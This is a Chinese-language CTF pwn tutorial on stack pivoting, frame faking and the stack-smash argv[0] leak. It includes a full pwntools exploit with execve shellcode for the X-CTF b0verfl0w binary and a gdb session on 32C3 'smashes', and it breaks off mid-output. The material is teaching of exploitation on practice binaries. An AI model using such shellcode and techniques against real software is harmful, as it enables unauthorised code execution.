RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n    RWX:      Has RWX segments\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u6e90\u7a0b\u5e8f\u4e3a32\u4f4d\uff0c\u4e5f\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u627e\u4e00\u4e0b\u7a0b\u5e8f\u7684\u6f0f\u6d1e\n\n\nsigned\n \nint\n \nvul\n()\n\n\n{\n\n  \nchar\n \ns\n;\n \n// [sp+18h] [bp-20h]@1\n\n\n  \nputs\n(\n\\n\n======================\n);\n\n  \nputs\n(\n\\n\nWelcome to X-CTF 2016!\n);\n\n  \nputs\n(\n\\n\n======================\n);\n\n  \nputs\n(\nWhat\ns your name?\n);\n\n  \nfflush\n(\nstdout\n);\n\n  \nfgets\n(\ns\n,\n \n50\n,\n \nstdin\n);\n\n  \nprintf\n(\nHello %s.\n,\n \ns\n);\n\n  \nfflush\n(\nstdout\n);\n\n  \nreturn\n \n1\n;\n\n\n}\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u6e90\u7a0b\u5e8f\u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002\u4f46\u662f\u5176\u6240\u80fd\u6ea2\u51fa\u7684\u5b57\u8282\u5c31\u53ea\u670950-0x20-4=14\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u6267\u884c\u4e00\u4e9b\u6bd4\u8f83\u597d\u7684ROP\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u8003\u8651stack pivoting\u3002\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u5e76\u6ca1\u6709\u5f00\u542f\u5806\u6808\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u6808\u4e0a\u5e03\u7f6eshellcode\u5e76\u6267\u884c\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528\u6808\u6ea2\u51fa\u5e03\u7f6eshellcode\n\n\n\u63a7\u5236eip\u6307\u5411shellcode\u5904\n\n\n\n\n\u7b2c\u4e00\u6b65\uff0c\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u5730\uff0c\u76f4\u63a5\u8bfb\u53d6\u5373\u53ef\uff0c\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u6211\u4eec\u5f88\u96be\u76f4\u63a5\u77e5\u9053shellcode\u7684\u5730\u5740\u3002\u4f46\u662f\u6808\u4e0a\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6808\u6ea2\u51fa\u5bf9esp\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f7f\u5176\u6307\u5411shellcode\u5904\uff0c\u5e76\u4e14\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u81f3esp\u5904\u3002\u90a3\u4e0b\u9762\u5c31\u662f\u627e\u63a7\u5236\u7a0b\u5e8f\u8df3\u8f6c\u5230esp\u5904\u7684gadgets\u4e86\u3002\n\n\n\u279c  X-CTF Quals \n2016\n - b0verfl0w git:\n(\niromise\n)\n \u2717 ROPgadget --binary b0verfl0w --only \njmp|ret\n         \nGadgets \ninformation\n\n\n============================================================\n\n0x08048504 : jmp esp\n0x0804836a : ret\n0x0804847e : ret 0xeac1\n\nUnique gadgets found: \n3\n\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u53d1\u73b0\u6709\u4e00\u4e2a\u53ef\u4ee5\u76f4\u63a5\u8df3\u8f6c\u5230esp\u7684gadgets\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5e03\u7f6epayload\u5982\u4e0b\n\n\nshellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp\n\n\n\n\n\u90a3\u4e48\u6211\u4eecpayload\u4e2d\u7684\u6700\u540e\u4e00\u90e8\u5206\u6539\u5982\u4f55\u8bbe\u7f6eesp\u5462\uff0c\u53ef\u4ee5\u77e5\u9053\n\n\n\n\nsize(shellcode+padding)=0x20\n\n\nsize(fake ebp)=0x4\n\n\nsize(0x08048504)=0x4\n\n\n\n\n\u6240\u4ee5\u6211\u4eec\u6700\u540e\u4e00\u6bb5\u9700\u8981\u6267\u884c\u7684\u6307\u4ee4\u5c31\u662f\n\n\nsub\n \n0x28\n,\nesp\n\n\njmp\n \nesp\n\n\n\n\n\n\u6240\u4ee5\u6700\u540e\u7684exp\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nsh\n \n=\n \nprocess\n(\n./b0verfl0w\n)\n\n\n\nshellcode_x86\n \n=\n \n\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\n\n\nshellcode_x86\n \n+=\n \n\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\n\n\nshellcode_x86\n \n+=\n \n\\x0b\\xcd\\x80\n\n\n\nsub_esp_jmp\n \n=\n \nasm\n(\nsub esp, 0x28;jmp esp\n)\n\n\njmp_esp\n \n=\n \n0x08048504\n\n\npayload\n \n=\n \nshellcode_x86\n \n+\n \n(\n\n    \n0x20\n \n-\n \nlen\n(\nshellcode_x86\n))\n \n*\n \nb\n \n+\n \nbbbb\n \n+\n \np32\n(\njmp_esp\n)\n \n+\n \nsub_esp_jmp\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u4f8b2-\u8f6c\u79fb\u5806\n\n\n\u5f85\u3002\n\n\n\u9898\u76ee\n\n\n\n\nEkoPartyCTF 2016 fuckzing-exploit-200\n\n\n\n\nframe faking\n\n\n\u6b63\u5982\u8fd9\u4e2a\u6280\u5de7\u540d\u5b57\u6240\u8bf4\u7684\u90a3\u6837\uff0c\u8fd9\u4e2a\u6280\u5de7\u5c31\u662f\u6784\u9020\u4e00\u4e2a\u865a\u5047\u7684\u6808\u5e27\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\n\n\n\u539f\u7406\n\n\n\u6982\u62ec\u5730\u8bb2\uff0c\u6211\u4eec\u5728\u4e4b\u524d\u8bb2\u7684\u6808\u6ea2\u51fa\u4e0d\u5916\u4e4e\u4e24\u79cd\u65b9\u5f0f\n\n\n\n\n\u63a7\u5236\u7a0b\u5e8fEIP\n\n\n\u63a7\u5236\u7a0b\u5e8fEBP\n\n\n\n\n\u5176\u6700\u7ec8\u90fd\u662f\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002\u5728frame faking\u4e2d\uff0c\u6211\u4eec\u6240\u5229\u7528\u7684\u6280\u5de7\u4fbf\u662f\u540c\u65f6\u63a7\u5236EBP\u4e0eEIP\uff0c\u8fd9\u6837\u6211\u4eec\u5728\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7684\u540c\u65f6\uff0c\u4e5f\u6539\u53d8\u7a0b\u5e8f\u6808\u5e27\u7684\u4f4d\u7f6e\u3002\u4e00\u822c\u6765\u8bf4\u5176payload\u5982\u4e0b\n\n\nbuffer padding|fake ebp|leave ret addr|\n\n\n\n\n\u5373\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u5c06\u6808\u4e0a\u6784\u9020\u4e3a\u5982\u4e0a\u683c\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u63a5\u4e0b\u540e\u9762\u4e24\u4e2a\u90e8\u5206\n\n\n\n\n\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u88ab\u6211\u4eec\u8986\u76d6\u4e3a\u6267\u884cleave ret\u7684\u5730\u5740\uff0c\u8fd9\u5c31\u8868\u660e\u4e86\u51fd\u6570\u5728\u6b63\u5e38\u6267\u884c\u5b8c\u81ea\u5df1\u7684leave ret\u540e\uff0c\u8fd8\u4f1a\u518d\u6b21\u6267\u884c\u4e00\u6b21leave ret\u3002\n\n\n\u5176\u4e2dfake ebp\u4e3a\u6211\u4eec\u6784\u9020\u7684\u6808\u5e27\u7684\u57fa\u5730\u5740\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u662f\u4e00\u4e2a\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u6784\u9020\u7684\u5047\u7684\u6808\u5e27\u5982\u4e0b\n\n\n\n\nfake ebp\n|\nv\nebp2|target function addr|leave ret addr|arg1|arg2\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u7684fake ebp\u6307\u5411ebp2\uff0c\u5373\u5b83\u4e3aebp2\u6240\u5728\u7684\u5730\u5740\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u8fd9\u91cc\u90fd\u662f\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u53ef\u8bfb\u7684\u5185\u5bb9\u3002\n\n\n\u4e0b\u9762\u7684\u6c47\u7f16\u8bed\u6cd5\u662f AT\nT \u8bed\u6cd5\u3002\n\n\n\u5728\u6211\u4eec\u4ecb\u7ecd\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u4e4b\u524d\uff0c\u6211\u4eec\u8fd8\u662f\u6709\u5fc5\u8981\u8bf4\u4e00\u4e0b\uff0c\u51fd\u6570\u7684\u5165\u53e3\u70b9\u4e0e\u51fa\u53e3\u70b9\u7684\u57fa\u672c\u64cd\u4f5c\n\n\n\u5165\u53e3\u70b9\n\n\npush ebp  # \u5c06ebp\u538b\u6808\nmove esp, ebp #\u5c06esp\u7684\u503c\u8d4b\u7ed9ebp\n\n\n\n\n\u51fa\u53e3\u70b9\n\n\nleave\nret #pop eip\uff0c\u5f39\u51fa\u6808\u9876\u5143\u7d20\u4f5c\u4e3a\u7a0b\u5e8f\u4e0b\u4e00\u4e2a\u6267\u884c\u5730\u5740\n\n\n\n\n\u5176\u4e2dleave\u6307\u4ee4\u76f8\u5f53\u4e8e\n\n\nmove ebp, esp # \u5c06ebp\u7684\u503c\u8d4b\u7ed9esp\npop ebp #\u5f39\u51faebp\n\n\n\n\n\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u8bf4\u4e00\u4e0b\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u3002\n\n\n\n\n\n\n\u5728\u6709\u6808\u6ea2\u51fa\u7684\u7a0b\u5e8f\u6267\u884cleave\u65f6\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4\n\n\n\n\n\n\nmove ebp, esp \uff0c\u8fd9\u4f1a\u5c06esp\u4e5f\u6307\u5411\u5f53\u524d\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684ebp\u57fa\u5730\u5740\u5904\u3002\n\n\n\n\n\n\npop ebp\uff0c \u8fd9\u4f1a\u5c06\u6808\u4e2d\u5b58\u653e\u7684fake ebp\u7684\u503c\u8d4b\u7ed9ebp\u3002\u5373\u6267\u884c\u5b8c\u6307\u4ee4\u4e4b\u540e\uff0cebp\u4fbf\u6307\u5411\u4e86ebp2\uff0c\u4e5f\u5c31\u662f\u4fdd\u5b58\u4e86ebp2\u6240\u5728\u7684\u5730\u5740\u3002\n\n\n\n\n\n\n\u6267\u884cret\u6307\u4ee4\uff0c\u4f1a\u518d\u6b21\u6267\u884cleave ret\u6307\u4ee4\u3002\n\n\n\n\n\n\n\u6267\u884cleave\u6307\u4ee4\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4\n\n\n\n\n\n\nmove ebp, esp \uff0c\u8fd9\u4f1a\u5c06esp\u6307\u5411ebp2\u3002\n\n\n\n\n\n\npop ebp\uff0c\u6b64\u65f6\uff0c\u4f1a\u5c06ebp\u7684\u5185\u5bb9\u8bbe\u7f6e\u4e3aebp2\u7684\u503c\uff0c\u540c\u65f6esp\u4f1a\u6307\u5411target function\u3002\n\n\n\n\n\n\n\u6267\u884cret\u6307\u4ee4\uff0c\u8fd9\u65f6\u5019\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884ctargetfunction\uff0c\u5f53\u5176\u8fdb\u884c\u7a0b\u5e8f\u7684\u65f6\u5019\u4f1a\u6267\u884c\n\n\n\n\n\n\npush ebp,\u4f1a\u5c06ebp2\u503c\u538b\u5165\u6808\u4e2d\uff0c\n\n\n\n\n\n\nmove esp, ebp\uff0c\u5c06ebp\u6307\u5411\u5f53\u524d\u57fa\u5730\u5740\u3002\n\n\n\n\n\n\n\u6b64\u65f6\u7684\u6808\u7ed3\u6784\u5982\u4e0b\n\n\nebp\n|\nv\nebp2|leave ret addr|arg1|arg2\n\n\n\n\n\n\n\n\n\u5f53\u7a0b\u5e8f\u6267\u884c\u5e08\uff0c\u5176\u4f1a\u6b63\u5e38\u7533\u8bf7\u7a7a\u95f4\uff0c\u540c\u65f6\u6211\u4eec\u5728\u6808\u4e0a\u4e5f\u5b89\u6392\u4e86\u8be5\u51fd\u6570\u5bf9\u5e94\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\u3002\n\n\n\n\n\n\n\u7a0b\u5e8f\u7ed3\u675f\u540e\uff0c\u5176\u53c8\u4f1a\u6267\u884c\u4e24\u6b21 leave ret addr\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5728ebp2\u5904\u5e03\u7f6e\u597d\u4e86\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e00\u76f4\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002\n\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u5728fake frame\u4e2d\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u9700\u6c42\u5c31\u662f\uff0c\u6211\u4eec\u5fc5\u987b\u5f97\u6709\u4e00\u5757\u53ef\u4ee5\u5199\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u6211\u4eec\u8fd8\u77e5\u9053\u8fd9\u5757\u5185\u5b58\u7684\u5730\u5740\uff0c\u8fd9\u4e00\u70b9\u4e0estack pivoting\u76f8\u4f3c\u3002\n\n\n\u4f8b\u5b50\n\n\n\u76ee\u524d\u6765\u8bf4\uff0c\u6211\u5728exploit-exercise\u7684fusion level2\u4e2d\u5229\u7528\u8fc7\u8fd9\u4e2a\u6280\u5de7\uff0c\u5176\u5b83\u5730\u65b9\u6682\u65f6\u8fd8\u672a\u9047\u5230\uff0c\u9047\u5230\u7684\u65f6\u5019\u518d\u8fdb\u884c\u8865\u5145\u3002\n\n\n\u9898\u76ee\n\n\n\u53c2\u8003\u9605\u8bfb\n\n\n\n\nhttp://www.xfocus.net/articles/200602/851.html\n\n\nhttp://phrack.org/issues/58/4.html\n\n\n\n\nStack smash\n\n\n\u539f\u7406\n\n\n\u5728\u7a0b\u5e8f\u52a0\u4e86canary\u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684buffer\u8986\u76d6\u4e86\u5bf9\u5e94\u7684\u503c\u65f6\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u62a5\u9519\uff0c\u800c\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u5e76\u4e0d\u4f1a\u5173\u5fc3\u62a5\u9519\u4fe1\u606f\u3002\u800cstack smash\u6280\u5de7\u5219\u5c31\u662f\u5229\u7528\u6253\u5370\u8fd9\u4e00\u4fe1\u606f\u7684\u7a0b\u5e8f\u6765\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u7a0b\u5e8f\u53d1\u73b0canary\u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u53d1\u73b0canary\u88ab\u4fee\u6539\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c__stack_chk_fail\u51fd\u6570\u6765\u6253\u5370argv[0]\u6307\u9488\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u4e86\u7a0b\u5e8f\u540d\u3002\u5176\u4ee3\u7801\u5982\u4e0b\n\n\nvoid\n \n__attribute__\n \n((\nnoreturn\n))\n \n__stack_chk_fail\n \n(\nvoid\n)\n\n\n{\n\n  \n__fortify_fail\n \n(\nstack smashing detected\n);\n\n\n}\n\n\nvoid\n \n__attribute__\n \n((\nnoreturn\n))\n \ninternal_function\n \n__fortify_fail\n \n(\nconst\n \nchar\n \n*\nmsg\n)\n\n\n{\n\n  \n/* The loop is added only to keep gcc happy.  */\n\n  \nwhile\n \n(\n1\n)\n\n    \n__libc_message\n \n(\n2\n,\n \n*** %s ***: %s terminated\n\\n\n,\n\n                    \nmsg\n,\n \n__libc_argv\n[\n0\n]\n \n?:\n \nunknown\n);\n\n\n}\n\n\n\n\n\n\u6240\u4ee5\u8bf4\u5982\u679c\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u8986\u76d6argv[0]\u4e3a\u6211\u4eec\u60f3\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u90a3\u4e48\u5728__fortify_fail\u51fd\u6570\u4e2d\u5c31\u4f1a\u8f93\u51fa\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52015\u5e7432C3 CTF smashes\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8be5\u9898\u76ee\u5728jarvisoj\u4e0a\u6709\u590d\u73b0\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3a64\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86Canary\u4fdd\u62a4\u4ee5\u53caNX\u4fdd\u62a4\uff0c\u4ee5\u53caFORTIFY\u4fdd\u62a4\u3002\n\n\n\u279c  stacksmashes git:\n(\nmaster\n)\n \u2717 checksec smashes\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n    FORTIFY:  Enabled\n\n\n\n\n\u5206\u6790\u7a0b\u5e8f\n\n\nida\u770b\u4e00\u4e0b\n\n\n__int64\n \nsub_4007E0\n()\n\n\n{\n\n  \n__int64\n \nv0\n;\n \n// rax@1\n\n  \n__int64\n \nv1\n;\n \n// rbx@2\n\n  \nint\n \nv2\n;\n \n// eax@3\n\n  \n__int64\n \nv4\n;\n \n// [sp+0h] [bp-128h]@1\n\n  \n__int64\n \nv5\n;\n \n// [sp+108h] [bp-20h]@1\n\n\n  \nv5\n \n=\n \n*\nMK_FP\n(\n__FS__\n,\n \n40LL\n);\n\n  \n__printf_chk\n(\n1LL\n,\n \n(\n__int64\n)\nHello!\n\\n\nWhat\ns your name? \n);\n\n  \nLODWORD\n(\nv0\n)\n \n=\n \n_IO_gets\n((\n__int64\n)\nv4\n);\n\n  \nif\n \n(\n \n!\nv0\n \n)\n\n\nLABEL_9\n:\n\n    \n_exit\n(\n1\n);\n\n  \nv1\n \n=\n \n0LL\n;\n\n  \n__printf_chk\n(\n1LL\n,\n \n(\n__int64\n)\nNice to meet you, %s.\n\\n\nPlease overwrite the flag: \n);\n\n  \nwhile\n \n(\n \n1\n \n)\n\n  \n{\n\n    \nv2\n \n=\n \n_IO_getc\n(\nstdin\n);\n\n    \nif\n \n(\n \nv2\n \n==\n \n-\n1\n \n)\n\n      \ngoto\n \nLABEL_9\n;\n\n    \nif\n \n(\n \nv2\n \n==\n \n\\n\n \n)\n\n      \nbreak\n;\n\n    \nbyte_600D20\n[\nv1\n++\n]\n \n=\n \nv2\n;\n\n    \nif\n \n(\n \nv1\n \n==\n \n \n \n)\n\n      \ngoto\n \nLABEL_8\n;\n\n  \n}\n\n  \nmemset\n((\nvoid\n \n*\n)((\nsigned\n \nint\n)\nv1\n \n+\n \n0x600D20LL\n),\n \n0\n,\n \n(\nunsigned\n \nint\n)(\n32\n \n-\n \nv1\n));\n\n\nLABEL_8\n:\n\n  \nputs\n(\nThank you, bye!\n);\n\n  \nreturn\n \n*\nMK_FP\n(\n__FS__\n,\n \n40LL\n)\n \n^\n \nv5\n;\n\n\n}\n\n\n\n\n\n\u5f88\u663e\u7136\uff0c\u7a0b\u5e8f\u5728_IO_gets((__int64)\nv4);\u5b58\u5728\u6808\u6ea2\u51fa\u3002\n\n\n\u6b64\u5916\uff0c\u7a0b\u5e8f\u4e2d\u8fd8\u63d0\u793a\u8981overwrite flag\u3002\u800c\u4e14\u53d1\u73b0\u7a0b\u5e8f\u5f88\u6709\u610f\u601d\u7684\u5728while\u5faa\u73af\u4e4b\u540e\u6267\u884c\u4e86\u8fd9\u6761\u8bed\u53e5\n\n\n  \nmemset\n((\nvoid\n \n*\n)((\nsigned\n \nint\n)\nv1\n \n+\n \n0x600D20LL\n),\n \n0\n,\n \n(\nunsigned\n \nint\n)(\n32\n \n-\n \nv1\n));\n\n\n\n\n\n\u53c8\u770b\u4e86\u770b\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u5185\u5bb9\uff0c\u8bf4\u660e\u7a0b\u5e8f\u7684flag\u5c31\u5728\u8fd9\u91cc\u554a\u3002\n\n\n.data:0000000000600D20 ; char aPctfHereSTheFl[]\n.data:0000000000600D20 aPctfHereSTheFl db \nPCTF{Here\n,27h,\ns the flag on server}\n,0\n\n\n\n\n\u4f46\u662f\u5982\u679c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u6808\u6ea2\u51fa\u8f93\u51fa\u8be5\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u53ef\u884c\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bfb\u5165\u7684\u5185\u5bb9\nbyte_600D20[v1++] = v2;\n\u4e5f\u6070\u6070\u5c31\u662f\u8be5\u5757\u5185\u5b58\uff0c\u8fd9\u4f1a\u76f4\u63a5\u5c06\u5176\u8986\u76d6\u6389\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u4e00\u4e2a\u6280\u5de7\u4e86\n\n\n\n\n\u5728EFL\u5185\u5b58\u6620\u5c04\u65f6\uff0cbss\u6bb5\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u5904\u7684\u5730\u5740\u6765\u8fdb\u884c\u8f93\u51fa\uff0c\u53ef\u4ee5\u4f7f\u7528gdb\u7684find\u6765\u8fdb\u884c\u67e5\u627e\u3002\n\n\n\n\n\u786e\u5b9aflag\u5730\u5740\n\n\n\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u8f7dmemset\u51fd\u6570\u5904\uff0c\u7136\u540e\u8bfb\u53d6\u76f8\u5e94\u7684\u5185\u5bb9\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nc\n\n\nContinuing.\n\n\nHello\n!\n\n\nWhat\ns\n \nyour\n \nname\n?\n \nqqqqqqq\n\n\nNice\n \nto\n \nmeet\n \nyou\n,\n \nqqqqqqq.\n\n\nPlease\n \noverwrite\n \nthe\n \nflag\n:\n \n222222222\n\n\n\nBreakpoint\n \n1\n,\n \n__memset_avx2\n \n()\n \nat\n \n..\n/\nsysdeps\n/\nx86_64\n/\nmultiarch\n/\nmemset-avx2.S\n:\n38\n\n\n38\n  \n..\n/\nsysdeps\n/\nx86_64\n/\nmultiarch\n/\nmemset-avx2.S\n:\n \n\u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55\n.\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:i386:\nx86-64\n \n]\n\u2500\u2500\u2500\u2500\n\n   \n0\nx7ffff7b7f920\n \n__memset_chk_avx2\n+\n0\n \ncmp\n    \nrcx\n,\n \nrdx\n\n   \n0\nx7ffff7b7f923\n \n__memset_chk_avx2\n+\n3\n \njb\n     \n0x7ffff7b24110\n \n__GI___chk_fail\n\n   \n0\nx7ffff7b7f929\n                  \nnop\n    \nDWORD\n \nPTR\n \n[\nrax\n+\n0x0\n]\n\n \n\u2192\n \n0\nx7ffff7b7f930\n \n__memset_avx2\n+\n0\n \nvpxor\n  \nxmm0\n,\n \nxmm0\n,\n \nxmm0\n\n   \n0\nx7ffff7b7f934\n \n__memset_avx2\n+\n4\n \nvmovd\n  \nxmm1\n,\n \nesi\n\n   \n0\nx7ffff7b7f938\n \n__memset_avx2\n+\n8\n \nlea\n    \nrsi\n,\n \n[\nrdi\n+\nrdx\n*\n1\n]\n\n   \n0\nx7ffff7b7f93c\n \n__memset_avx2\n+\n12\n \nmov\n    \nrax\n,\n \nrdi\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nx7fffffffda38\n,\n \nl8\n]\n\n\n8\n\n\n0\nx00007fffffffda38\n\u2502+\n0x00\n:\n \n0x0000000000400878\n  \n\u2192\n   \nmov\n \nedi\n,\n \n0x40094e\n  \n\u2190\n \n$rsp\n\n\n0\nx00007fffffffda40\n\u2502+\n0x08\n:\n \n0x0071717171717171\n \n(\nqqqqqqq\n?\n)\n\n\n0\nx00007fffffffda48\n\u2502+\n0x10\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda50\n\u2502+\n0x18\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda58\n\u2502+\n0x20\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda60\n\u2502+\n0x28\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda68\n\u2502+\n0x30\n:\n \n0x0000000000000000\n\n\n0\nx00007fffffffda70\n\u2502+\n0x38\n:\n \n0x0000000000000000\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n#0] 0x7ffff7b7f930 \u2192 Name: __memset_avx2()\n\n\n[\n#1] 0x400878 \u2192 mov edi, 0x40094e\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \nfind\n \n22222\n\n\nArgument\n \nrequired\n \n(\nexpression\n \nto\n \ncompute\n).\n\n\ngef\n\u27a4\n  \nfind\n \n22222\n\n\nNo\n \nsymbol\n \n22222\n \nin\n \ncurrent\n \ncontext.\n\n\ngef\n\u27a4\n  \ngrep\n \n22222\n\n\n[+]\n \nSearching\n \n22222\n \nin\n \nmemory\n\n\n[+]\n \nIn\n \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexample\n/\nstacksmashes\n/\nsmashes\n(\n0x600000\n-\n0x601000\n),\n \npermission\n=\nrw-\n\n  \n0\nx600d20\n \n-\n \n0x600d3f\n  \n\u2192\n   \n222222222\ns\n \nthe\n \nflag\n \non\n \nserver\n}\n \n\n[\n+\n]\n \nIn\n \n[\nheap\n]\n(\n0x601000\n-\n0x622000\n),\n \npermission\n=\nrw-\n\n  \n0\nx601010\n \n-\n \n0x601019\n  \n\u2192\n   \n222222222\n 